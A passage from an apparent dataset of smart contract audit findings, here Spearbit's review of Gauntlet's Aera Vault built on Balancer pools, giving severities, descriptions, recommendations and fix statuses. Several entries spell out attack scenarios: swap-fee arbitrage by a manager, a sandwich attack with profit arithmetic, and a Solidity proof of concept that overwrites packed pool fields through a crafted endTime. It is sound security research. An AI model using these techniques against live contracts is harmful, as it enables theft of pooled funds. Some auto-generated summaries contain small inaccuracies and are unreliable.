      "content": "## Severity: High Risk\n\n## Context\nAeraVaultV1.sol\n\n## Description\nBalancer offers a liquidity mining rewards distribution for liquidity providers. \n\nLiquidity Mining distributions are available to claim weekly through the `MerkleOrchard` contract. Liquidity Providers can claim tokens from this contract by submitting claims to the tokens. These claims are checked against a Merkle root of the accrued token balances which are stored in a Merkle tree. Claiming through the `MerkleOrchard` is much more gas-efficient than the previous generation of claiming contracts, especially when claiming multiple weeks of rewards, and when claiming multiple tokens.\n\nThe AeraVault is itself the only liquidity provider of the Balancer pool deployed, so each week it’s entitled to claim those rewards. Currently, those rewards cannot be claimed because the AeraVault is missing an implementation to interact with the `MerkleOrchard` contract, causing all rewards (BAL + other tokens) to remain in the `MerkleOrchard` forever.\n\n## Recommendation\nAdd a function to allow the vault owner (the Treasury) to claim those rewards. More information on how to claim rewards and interact with the contract can be found directly in the Balancer Documentation website.\n\nRewards claimed by the AeraVault can be later distributed to the Treasury via the sweep function.\n\n## Gauntlet\nRecommendation implemented in PR #146.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about the AeraVaultV1.sol, which is a liquidity provider of a Balancer pool. The AeraVault is entitled to claim rewards from the MerkleOrchard contract but is missing an implementation to interact with the contract. As a result, all rewards (BAL + other tokens) remain in the MerkleOrchard forever. \n\nThe recommendation is to add a function to allow the vault owner (the Treasury) to claim those rewards. Information on how to interact with the contract can be found on the Balancer Documentation website. Rewards claimed by the AeraVault can then be distributed to the Treasury via the sweep function. Gauntlet has implemented the recommendation in PR #146 and Spearbit has acknowledged it.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Fund Lock",
        "Business Logic"
      ],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7093",
      "title": "The vault manager has unchecked power to create arbitrage using setSwapFees",
      "impact": "HIGH",
      "content": "## High Risk Vulnerability Report\n\n## Severity\n**High Risk**\n\n## Context\n- AeraVaultV1.sol: Lines 663-679\n- BasePool.sol: Lines 58-59\n\n## Description\nA previously known issue was that a malicious vault manager could arbitrage the vault like in the below scenario:\n\n1. Set the swap fees to a high value by calling `setSwapFee` (10% is the maximum).\n2. Wait for the market price to move against the spot price.\n3. In the same transaction, reduce the swap fees to ~0 (0.0001% is the minimum) and arbitrage the vault.\n\nThe proposed fix was to limit the percentage change of the swap fee to a maximum of `MAXIMUM_SWAP_FEE_PERCENT_CHANGE` each time. However, because there is no restriction on how many times the `setSwapFee` function can be called in a block or transaction, a malicious manager can still call it multiple times in the same transaction and eventually set the swap fee to the value they want.\n\n## Recommendation\nEnforce a cooldown period of reasonable length between two consecutive `setSwapFee` function calls.",
      "summary": "\nThis bug report is about a security vulnerability in the AeraVaultV1.sol and BasePool.sol contracts. A malicious vault manager could take advantage of the vulnerability by setting the swap fees to a high value and then reducing them to a very low value in the same transaction. This would allow the manager to arbitrage the vault. \n\nThe proposed fix was to limit the percentage change of the swap fee to a maximum of MAXIMUM_SWAP_FEE_PERCENT_CHANGE each time. However, because there is no restriction on how many times the setSwapFee function can be called in a block or transaction, a malicious manager can still call it multiple times in the same transaction and eventually set the swap fee to the value they want.\n\nThe recommendation to fix this issue is to enforce a cooldown period of reasonable length between two consecutive setSwapFee function calls. This would prevent the malicious manager from calling the function multiple times in the same transaction.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Cooldown",
        "Admin"
      ],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7092",
      "title": "updateWeightsGradually allows change rates to start in the past with a very high maximumRatio",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\nAeraVaultV1.sol#L599-L639\n\n## Description\nThe current `updateWeightsGradually` is using `startTime` instead of the minimal start time that should be `Math.max(block.timestamp, startTime)`. Because internally Balancer will use `startTime = Math.max(currentTime, startTime);` as the `startTime`, this allows for:\n\n- Having a `startTime` in the past.\n- Having a `targetWeights[i]` higher than allowed.\n\nWe also suggest adding another check to prevent `startTime > endTime`. Although Balancer replicates the same check, it is still needed in the Aera implementation to prevent transactions from reverting because of an underflow error on \n\n```solidity\nuint256 duration = endTime - startTime;\n```\n\n## Recommendation\nUpdate the code to correctly initialize the `startTime` value and add a check to prevent having `endTime` in the past (`startTime > endTime`). A possible solution looks as follows:\n\n```solidity\nfunction updateWeightsGradually( ... ) ... {\n    startTime = Math.max(block.timestamp, startTime);\n    if (startTime > endTime) {\n        revert Aera__WeightChangeEndBeforeStart();\n    }\n    if (\n        Math.max(block.timestamp, startTime) +\n        MINIMUM_WEIGHT_CHANGE_DURATION > endTime\n    ) {\n        revert Aera__WeightChangeDurationIsBelowMin(\n            endTime - startTime, // no longer reverts\n            MINIMUM_WEIGHT_CHANGE_DURATION\n        );\n    }\n    ...\n}\n```\n\n## Gauntlet\nRecommendation implemented in PR #146\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about the AeraVaultV1.sol in which the function updateWeightsGradually is using startTime instead of the minimal start time that should be Math.max(block.timestamp, startTime). This allows the startTime to be in the past and targetWeights[i] to be higher than allowed. The recommendation is to update the code to correctly initialize the startTime value and add a check to prevent having endTime in the past (startTime > endTime). A possible solution is provided in the report. The recommendation is tested in PR #146 and acknowledged.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Update State After Admin Action"
      ],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7091",
      "title": "Malicious manager could cause Vault funds to be inaccessible",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\nAeraVaultV1.sol#L794-L822\n\n## Description\nThe `calculateAndDistributeManagerFees()` function pushes tokens to the manager, and if for unknown reasons this action fails, the entire Vault would be blocked, and funds become inaccessible. This occurs because the following functions depend on the execution of `calculateAndDistributeManagerFees()`: \n\n- `deposit()`\n- `withdraw()`\n- `setManager()`\n- `claimManagerFees()`\n- `initiateFinalization()`\n- `finalize()`\n\nWithin `calculateAndDistributeManagerFees()`, the function `safeTransfer()` is the riskiest and could fail under the following situations:\n\n- A token with a callback is used, for example, an ERC777 token, and the callback is not implemented correctly.\n- A token with a blacklist option is used and the manager is blacklisted. For example, USDC has such blacklist functionality. Because the manager can be an unknown party, a small risk exists that he is malicious and his address could be blacklisted in USDC.\n\n**Note:** Set as high risk because although probability is very small, impact results in Vault funds becoming inaccessible.\n\n```solidity\nfunction calculateAndDistributeManagerFees() internal {\n    ...\n    for (uint256 i = 0; i < amounts.length; i++) {\n        tokens[i].safeTransfer(manager, amounts[i]);\n    }\n}\n```\n\n## Recommendation\nBeware of including tokens with callbacks such as ERC777 tokens into the Vault. Additionally, use a pull over push pattern to let the manager retrieve fees. This way, the Vault can never get blocked. This recommendation can be implemented as follows:\n\n- Rename `calculateAndDistributeManagerFees()` to `calculateManagerFees()`.\n- In `calculateManagerFees()`, add up all management fees (for each manager address separately, e.g., in a mapping), to prevent having to push the fees in `setManager()` and keep track of the total of the fees (`managersFeeTotal`) to make sure fees are not withdrawn.\n- In `withdraw()` and `returnFunds()`, make sure unclaimed fees cannot be withdrawn.\n- Let the manager retrieve fees via `claimManagerFees()`, using `msg.sender` as the index to the mapping with the fees. This function should retrieve Balancer funds, e.g., use the code of the second half of `calculateAndDistributeManagerFees()`. It should also lower `managersFeeTotal` and the fee for `msg.sender`.\n\nThis also alleviates rounding issues with fees and reduces gas used by `deposit()`, which could be relevant when pools are deployed with a large number of tokens.\n\nAn alternative could be to use `try/catch` around the call to `safeTransfer()`, but this way the fees aren’t distributed properly.\n\n## Gauntlet\nWe will be incorporating the suggestions.",
      "summary": "\nThis bug report is about the function calculateAndDistributeManagerFees() in the AeraVaultV1.sol smart contract. This function pushes tokens to the manager and if for any reason this action fails, the entire Vault would be blocked and funds become inaccessible. This is because several other functions depend on the execution of calculateAndDistributeManagerFees(). The riskiest action within this function is the call to safeTransfer(), which could fail if the token used has a callback that is not implemented correctly, or if the manager is blacklisted.\n\nThe recommendation is to use a pull over push pattern to let the manager retrieve fees. This way the Vault can never get blocked. This can be implemented by renaming calculateAndDistributeManagerFees() to calculateManagerFees(), adding up the management fees in a mapping, making sure unclaimed fees cannot be withdrawn, and letting the manager retrieve fees via claimManagerFees(). An alternative could be to use try/catch around the call to safeTransfer(), but this way the fees aren’t distributed properly. Gauntlet will be incorporating the suggestions.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Reentrancy",
        "Admin"
      ],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7090",
      "title": "Managed Pools are still undergoing development and may contain bugs and/or significant changes",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\nbalancer-v2-monorepo\n\n## Description\nThe ManagedPool smart pool implementation of WeightedPool is still in active development by the Balancer team and could have unknown bugs. Additionally, the current version in Balancer’s GitHub is different from the version used in Mannon Vault.  \n**Note:** The Gauntlet team has also flagged this as an issue.\n\n## Recommendation\nUse the latest version of ManagedPool. Consider using new functionalities like AUM (managementAumFeePercentage) fees.  \nAlso, see the following issues:\n- Check with Balancer team about best approach to add and remove funds\n- Manager can cause an immediate weight change\n- Important fields of Balancer can be overwritten by EndTime\n\nOnly deploy once ManagedPool is stable and considered production-ready.\n\n## Gauntlet\nFix implemented in PR #11. We should still update to the latest version at this stage (and continue to do so).\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about the ManagedPool smart pool implementation of WeightedPool, which is still in active development by the Balancer team. There could be unknown bugs, and the version used in Mannon Vault is different from the version in Balancer's GitHub. The Gauntlet team has flagged this as an issue and recommended using the latest version of ManagedPool, considering new functionalities like AUM fees. It has also identified three issues to be checked with Balancer team - adding and removing funds, manager causing an immediate weight change and important fields of Balancer being overwritten by EndTime. The recommendation is to only deploy once ManagedPool is stable and considered production ready. The Gauntlet team has already implemented a fix in PR #11, but it is still recommended to update to the latest version. Spearbit has acknowledged the report.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7089",
      "title": "allowance() doesn’t limit withdraw() s",
      "impact": "HIGH",
      "content": "## High Risk Severity Report\n\n## Context\n- **PermissiveWithdrawalValidator.sol**: Lines 17-27\n- **IWithdrawalValidator.sol**\n- **AeraVaultV1.sol**: Lines 456-514\n\n## Description\nThe `allowance()` function is meant to limit withdrawal amounts. However, `allowance()` can only read and not alter state because its visibility is set to `view`. Therefore, the `withdraw()` function can be called on demand until the entire Vault/Pool balance has been drained, rendering the `allowance()` function ineffective.\n\n```solidity\nfunction withdraw(uint256[] calldata amounts) ... {\n    ...\n    uint256[] memory allowances = validator.allowance();\n    ...\n    for (uint256 i = 0; i < tokens.length; i++) {\n        if (amounts[i] > holdings[i] || amounts[i] > allowances[i]) {\n            revert Aera__AmountExceedAvailable(... );\n        }\n    }\n}\n```\n\n### Note on `allowance()`\n```solidity\n// can't update state due to view\nfunction allowance() external view override returns (uint256[] memory amounts) {\n    amounts = new uint256[](count);\n    for (uint256 i = 0; i < count; i++) {\n        amounts[i] = ANY_AMOUNT;\n    }\n}\n```\n\n## Recommendation\nRemove the `view` keyword from the `allowance()` template, e.g., from both `IWithdrawalValidator.sol` and `PermissiveWithdrawalValidator.sol`, to allow for state updates in future versions of `allowance()`.\n\n## Gauntlet\nI would say we need an additional callback to the Validator to notify it of actual withdrawal amounts. In cases where allowance is greater than holdings, there is no way for the Validator to know how much of its allowance was actually used.",
      "summary": "\nThis bug report concerns the withdrawal function of the AeraVaultV1.sol code. The allowance() function is meant to limit the amount of funds that can be withdrawn, however, the visibility of the allowance() function is set to view, meaning it can only read and not alter state. This renders the allowance() function ineffective and allows the withdraw() function to be called on demand until the entire Vault/Pool balance has been drained. \n\nThe recommendation is to remove the view keyword from the allowance() template in both IWithdrawalValidator.sol and PermissiveWithdrawalValidator.sol in order to update state in future versions of the allowance() function. Additionally, an additional callback to the Validator is suggested to notify it of actual withdraw amounts, as in cases when allowance is greater than holdings there is no way for the Validator to know how much of its allowance was used.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Allowance"
      ],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7088",
      "title": "deposit and withdraw functions are susceptible to sandwich attacks",
      "impact": "HIGH",
      "content": "## High Risk Vulnerability Report\n\n**Severity:** High Risk  \n**Context:** AeraVaultV1.sol#L402-L453, AeraVaultV1.sol#L456-L514  \n**Description:** Transactions calling the `deposit()` function are susceptible to sandwich attacks where an attacker can extract value from deposits. A similar issue exists in the `withdraw()` function but the minimum check on the pool holdings limits the attack’s impact.\n\n## Scenario Example\n(Assuming swap fees are ignored for simplicity):\n\n1. Suppose the Balancer pool contains two tokens, WETH and DAI, with weights of 0.5 each. Currently, there is 1 WETH and 3k DAI in the pool, and the WETH spot price is 3k.\n2. The Treasury wants to add another 3k DAI into the Aera vault, so it calls the `deposit()` function.\n3. The attacker front-runs the Treasury’s transaction. They swap 3k DAI into the Balancer pool and receive 0.5 WETH. The weights remain 0.5 and 0.5, but because WETH and DAI balances become 0.5 and 6k, WETH’s spot price now becomes 12k.\n4. At this point, the Treasury’s transaction adds 3k DAI into the Balancer pool and changes the weights to 0.6 and 0.4.\n5. The attacker back-runs the transaction and swaps the 0.5 WETH acquired in step 3 back to DAI, recovering WETH’s spot price to slightly above 3k. According to the current weights, they can receive 9k * (1 - 1/r) = 3.33k DAI from the pool, where r = (2^0.4)^(1/0.6).\n6. As a result, the attacker profits 3.33k - 3k = 0.33k DAI.\n\n## Recommendations\nPotential mitigations include:\n\n- Adopting a two-step deposit and withdraw model. First, disable trading and check that the pool’s spot price is within range. If it's not, enable trading again and let arbitragers rebalance the pool. Once rebalanced, proceed with the deposit or withdrawal before enabling trading again (possibly with adjusted weights).\n- Avoid depositing or withdrawing if the pool balance has changed in the same block. The `lastChangeBlock` variable stores the last block number where the pool balance was modified. Ensuring `lastChangeBlock` is less than the current block number can prevent same-block sandwich attacks. However, this mitigation does not prevent multi-block MEV attacks.\n- Similar to slippage protection, add price boundaries as parameters to the `deposit()` and `withdraw()` functions to ensure the pool's spot price remains within specified boundaries before and after the deposit or withdrawal. Revert the transaction if boundaries are not met.\n- Use Flashbots to reduce the likelihood of sandwich attacks.\n\n## Gauntlet Actions\nAs discussed, this is an issue related to spot price agnostic depositing into an AMM. V2 will introduce oracle-informed spot price updates. The following actions will be taken for V1:\n\n- Advise treasuries against making large deposits.\n- For sensitive or larger deposits, offer the option to reject the transaction if balances have changed in the block (tracked by `lastChangeBlock`), as implemented in PR #138.\n- Encourage treasuries to utilize flash bots when possible.\n\n## Spearbit Actions\nActions will be taken on a procedural level, rather than a technical one.",
      "summary": "\nThis bug report is about a vulnerability called sandwich attacks in the AeraVaultV1.sol smart contracts. It is considered a high risk vulnerability as it allows an attacker to extract value from deposits. The attack works by the attacker front-running and back-running a transaction from the treasury, thereby manipulating the spot price of a token in the Balancer pool and profiting from it.\n\nThe report suggests a few potential mitigations for this vulnerability, such as adopting a two-step deposit and withdraw model, avoiding deposits or withdrawals if the pool balance has changed in the same block, adding price boundaries as parameters to the deposit() and withdraw() functions, and using Flashbots to reduce sandwiching probabilities.\n\nGauntlet and Spearbit have taken some actions to address this vulnerability in AeraVaultV1.sol. They have advised treasuries against making large deposits, offered an option to reject the transaction if balances have been changed in the block, and advised treasuries to use flash bots when possible. These actions are procedural and not technical in nature.",
      "quality_score": 5,
      "rarity_score": 4.5,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Slippage",
        "Sandwich Attack"
      ],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7087",
      "title": "Manager can cause an immediate weight change",
      "impact": "HIGH",
      "content": "## High Risk Security Issue in ManagedPool.sol\n\n## Severity\n**High Risk**\n\n## Context\n- `ManagedPool.sol#L254-L272`\n- `ManagedPool.sol#L620-L654`\n- `ManagedPool.sol#L680-L698`\n\n## Description\nBalancer’s `ManagedPool` uses 32-bit values for `startTime` and `endTime` but does not verify if those values exist within that range. When `endTime` is set to \\(2^{32}\\), it becomes larger than `startTime`, so the `_require(startTime <= endTime, ...)` statement will not revert. When `endTime` is converted to 32 bits, it will get a value of 0, causing the check in `_calculateWeightChangeProgress()` with `if (currentTime >= endTime)` to be true, thus leading to an immediate weight change.\n\nThis allows the Manager to trigger an immediate weight change via the `updateWeightsGradually()` function and open arbitrage opportunities.\n\n**Note:** \n- `startTime` is also subject to this overflow problem.\n- The same issue occurs in the latest version of `ManagedPool`.\n- This issue has been reported to Balancer by the Spearbit team.\n\nAlso see the following issues:\n- Managed Pools are still undergoing development and may contain bugs and/or change significantly\n- Important fields of Balancer can be overwritten by `endTime`\n\n## Code Example\n```solidity\ncontract ManagedPool is BaseWeightedPool, ReentrancyGuard {\n    function updateWeightsGradually(uint256 startTime, uint256 endTime, ... ) {\n        ...\n        uint256 currentTime = block.timestamp;\n        startTime = Math.max(currentTime, startTime);\n        _require(startTime <= endTime, Errors.GRADUAL_UPDATE_TIME_TRAVEL); // will not revert if endTime == 2**32\n        ...\n        _startGradualWeightChange(startTime, endTime, _getNormalizedWeights(), endWeights, tokens);\n    }\n    \n    function _startGradualWeightChange(uint256 startTime, uint256 endTime, ... ) {\n        ...\n        _setMiscData(\n            _getMiscData().insertUint32(startTime, _START_TIME_OFFSET).insertUint32(endTime, _END_TIME_OFFSET) // this converts the values to 32 bits\n        );\n        ...\n    }\n    \n    function _calculateWeightChangeProgress() private view returns (uint256) {\n        uint256 currentTime = block.timestamp;\n        bytes32 poolState = _getMiscData();\n        uint256 startTime = poolState.decodeUint32(_START_TIME_OFFSET);\n        uint256 endTime = poolState.decodeUint32(_END_TIME_OFFSET);\n        if (currentTime >= endTime) { // will be true if endTime == (2**32) capped to 32 bits == 0\n            return FixedPoint.ONE;\n        } else ...\n        ...\n    }\n}\n```\n\n## Recommendation\nUse a `ManagedPool.sol` version that solves this issue. In the meantime, verify before `pool.updateWeightsGradually()` is called that:\n- `startTime <= type(uint32).max`\n- `endTime <= type(uint32).max`\n\n## Gauntlet\nRecommendation implemented in PR #145\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThe bug report is about a vulnerability found in the ManagedPool contract of Balancer. The vulnerability is that 32-bit values are used for startTime and endTime, but they are not verified if they exist within the range. This can result in endTime becoming larger than startTime, allowing a Manager to cause an immediate weight change via the updateWeightsGradually() function and open arbitrage opportunities. This issue is present in the latest version of the ManagedPool contract.\n\nThe recommendation is to use a ManagedPool version which solves this issue. In the meantime, users should verify that startTime and endTime are both less than the maximum value of a 32-bit integer before calling the updateWeightsGradually() function.\n\nGauntlet has implemented the recommendation in PR #145, and this has been acknowledged by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Update State After Admin Action",
        "Admin"
      ],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7086",
      "title": "sweep function should prevent Treasury from withdrawing pool’s BPTs",
      "impact": "HIGH",
      "content": "## Severity: Critical Risk\n\n## Context\nAeraVaultV1.sol#L559-L561\n\n## Description\nThe current `sweep()` implementation allows the vault owner (the Treasury) to sweep any token owned by the vault including BPTs (Balancer Pool Tokens) that have been minted by the Vault during the pool’s `initialDeposit()` function call. The current vault implementation does not need those BPTs to withdraw funds because they are passed directly through the AssetManager flow via `withdraw()` / `finalize()`.\n\nBeing able to withdraw BPTs would allow the Treasury to:\n- Withdraw funds without respecting the time period between `initiateFinalization()` and `finalize()` calls.\n- Withdraw funds without respecting Validator `allowance()` limits.\n- Withdraw funds without paying the manager’s fee for the last `withdraw()`.\n- Finalize the pool, withdrawing all funds and selling valueless BPTs on the market.\n- Sell or rent out BPTs and `withdraw()` funds afterwards, thus doubling the funds.\n\nSwap fees would not be paid because Treasury could call `setManager(newManager)`, where the new manager is someone controlled by the Treasury, subsequently calling `setSwapFee(0)` to remove the swap fee, which would be applied during an `exitPool()` event.\n\n**Note:** Once the BPT is retrieved, it can also be used to call `exitPool()`, as the `mustAllowlistLPs` check is ignored in `exitPool()`.\n\n## Recommendation\nAdd a check on the token input parameter to prevent Treasury from withdrawing the Pool’s BPT tokens.\n\n## Gauntlet\nFixed in PR #132\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about a critical risk found in AeraVaultV1.sol#L559-L561. This risk allows the vault owner, also known as the Treasury, to sweep any token owned by the vault, including Balancer Pool Tokens (BPTs). BPTs are tokens that are minted by the Vault during the pool’s initialDeposit() function call. The current vault implementation does not need these BPTs to withdraw funds because they are passed directly through the AssetManager flow via withdraw()/finalize(). \n\nThe Treasury is able to withdraw funds without respecting the time period between initiateFinalization() and finalize() calls, without respecting Validator allowance() limits, and without paying the manager’s fee for the last withdraw(). They are also able to finalize the pool, withdrawing all funds and selling valueless BPTs on the market. Furthermore, the Treasury can sell or rent out BPTs and withdraw funds afterwards, thus doubling the funds. This is possible because the Treasury can call setManager(newManager) and setSwapFee(0) to remove the swap fee, which would be applied during an exitPool() event.\n\nTo prevent this, the bug report recommends adding a check on the token input parameter to prevent the Treasury from withdrawing the Pool’s BTP tokens. The bug has been fixed in PR #132 and acknowledged by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7085",
      "title": "Important Balancer fields can be overwritten by EndTime",
      "impact": "HIGH",
      "content": "## Severity: Critical Risk\n\n**Context:**  \nManagedPool.sol#L75-L77, ManagedPool.sol#L84-L86, LegacyBasePool.sol, WordCodec.sol\n\n**Description:**  \nBalancer’s ManagedPool uses 32-bit values for `startTime` and `endTime`, but it does not verify if those values exist within that range. Values are stored in a 32-byte `_miscData` slot in BasePool via the `insertUint32()` function. Nevertheless, this function does not strip any excess bits, resulting in other fields stored in `_miscData` being overwritten. In the version that Aera Vault uses, only the \"restrict LP\" field can be overwritten, and by carefully crafting the value of `endTime`, the \"restrict LP\" boolean can be switched off, allowing anyone to use `joinPool`. \n\nThe Manager could cause this behavior via the `updateWeightsGradually()` function, while the Owner could do it via `enableTradingWithWeights()`.  \n**Note:** This issue has been reported to Balancer by the Spearbit team.\n\n```solidity\ncontract ManagedPool is BaseWeightedPool, ReentrancyGuard { // f14de92ac443d6daf1f3a42025b1ecdb8918f22e\n    // [ 64 bits | 119 bits | 1 bit | 32 bits | 32 bits | 7 bits | 1 bit ]\n    // [ reserved | unused | restrict LP | end time | start time | total tokens | swap flag ]\n    // |MSB\n    function _startGradualWeightChange(uint256 startTime, uint256 endTime, ... ) ... {\n        ...\n        _setMiscData(\n            _getMiscData().insertUint32(startTime, _START_TIME_OFFSET).insertUint32(endTime,\n            _END_TIME_OFFSET), !\n        ); // this converts the values to 32 bits\n        ...\n    }\n}\n```\n\nIn the latest version of ManagedPool, many more fields can be overwritten, including:\n\n- LP flag\n- Fee end/Fee start\n- Swap flag\n\n```solidity\ncontract ManagedPool is BaseWeightedPool, AumProtocolFeeCache, ReentrancyGuard { // current version\n    // [ 64 bits | 1 bit | 31 bits | 1 bit | 31 bits | 64 bits | 32 bits | 32 bits ]\n    // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ]\n    // |MSB LSB|\n}\n```\n\nThe following POC shows how fields can be manipulated.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\nimport \"hardhat/console.sol\";\n\ncontract checkbalancer {\n    uint256 private constant _MASK_1 = 2**(1) - 1;\n    uint256 private constant _MASK_31 = 2**(31) - 1;\n    uint256 private constant _MASK_32 = 2**(32) - 1;\n    uint256 private constant _MASK_64 = 2**(64) - 1;\n    uint256 private constant _MASK_192 = 2**(192) - 1;\n    \n    // [ 64 bits | 1 bit | 31 bits | 1 bit | 31 bits | 64 bits | 32 bits | 32 bits ]\n    // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ]\n    // |MSB LSB|\n    uint256 private constant _WEIGHT_START_TIME_OFFSET = 0;\n    uint256 private constant _WEIGHT_END_TIME_OFFSET = 32;\n    uint256 private constant _END_SWAP_FEE_PERCENTAGE_OFFSET = 64;\n    uint256 private constant _FEE_START_TIME_OFFSET = 128;\n    uint256 private constant _SWAP_ENABLED_OFFSET = 159;\n    uint256 private constant _FEE_END_TIME_OFFSET = 160;\n    uint256 private constant _MUST_ALLOWLIST_LPS_OFFSET = 191;\n    uint256 private constant _SWAP_FEE_PERCENTAGE_OFFSET = 192;\n\n    function insertUint32(bytes32 word,uint256 value,uint256 offset) internal pure returns (bytes32) {\n        bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_32 << offset));\n        return clearedWord | bytes32(value << offset);\n    }\n\n    function decodeUint31(bytes32 word, uint256 offset) internal pure returns (uint256) {\n        return uint256(word >> offset) & _MASK_31;\n    }\n\n    function decodeUint32(bytes32 word, uint256 offset) internal pure returns (uint256) {\n        return uint256(word >> offset) & _MASK_32;\n    }\n\n    function decodeUint64(bytes32 word, uint256 offset) internal pure returns (uint256) {\n        return uint256(word >> offset) & _MASK_64;\n    }\n\n    function decodeBool(bytes32 word, uint256 offset) internal pure returns (bool) {\n        return (uint256(word >> offset) & _MASK_1) == 1;\n    }\n\n    function insertBits192(bytes32 word,bytes32 value,uint256 offset) internal pure returns (bytes32) {\n        bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_192 << offset));\n        return clearedWord | bytes32((uint256(value) & _MASK_192) << offset);\n    }\n\n    constructor() {\n        bytes32 poolState;\n        bytes32 miscData;\n        uint startTime = 1 + 2*2**32;\n        uint endTime = 3 + 4*2**32 + 5*2**(32+64) + 2**(32+64+31) + 6*2**(32+64+31+1) +\n                       2**(32+64+31+1+31) + 7*2**(32+64+31+1+31+1);\n        \n        poolState = insertUint32(poolState,startTime, _WEIGHT_START_TIME_OFFSET);\n        poolState = insertUint32(poolState,endTime, _WEIGHT_END_TIME_OFFSET);\n        miscData = insertBits192(miscData,poolState,0);\n        \n        console.log(\"startTime\", decodeUint32(miscData, _WEIGHT_START_TIME_OFFSET)); // 1\n        console.log(\"endTime\", decodeUint32(miscData, _WEIGHT_END_TIME_OFFSET)); // 3\n        console.log(\"endSwapFeePercentage\", decodeUint64(miscData, _END_SWAP_FEE_PERCENTAGE_OFFSET)); // 4\n        console.log(\"Fee startTime\", decodeUint31(miscData, _FEE_START_TIME_OFFSET)); // 5\n        console.log(\"Swap enabled\", decodeBool(miscData, _SWAP_ENABLED_OFFSET)); // true\n        console.log(\"Fee endTime\", decodeUint31(miscData, _FEE_END_TIME_OFFSET)); // 6\n        console.log(\"AllowlistLP\", decodeBool(miscData, _MUST_ALLOWLIST_LPS_OFFSET)); // true\n        console.log(\"Swap fee percentage\", decodeUint64(poolState, _SWAP_FEE_PERCENTAGE_OFFSET)); // 7\n        console.log(\"Swap fee percentage\", decodeUint64(miscData, _SWAP_FEE_PERCENTAGE_OFFSET)); // 0 due to miscData conversion\n    }\n}\n```\n\n**Recommendation:**  \nMake use of a ManagedPool.sol version which resolves this issue. In the meantime, before any call is made to `pool.updateWeightsGradually()`, verify that:\n\n- `startTime <= type(uint32).max`\n- `endTime <= type(uint32).max`\n\n**Gauntlet:** Recommendation implemented in PR #145  \n**Spearbit:** Acknowledged. Recommendation has been implemented.",
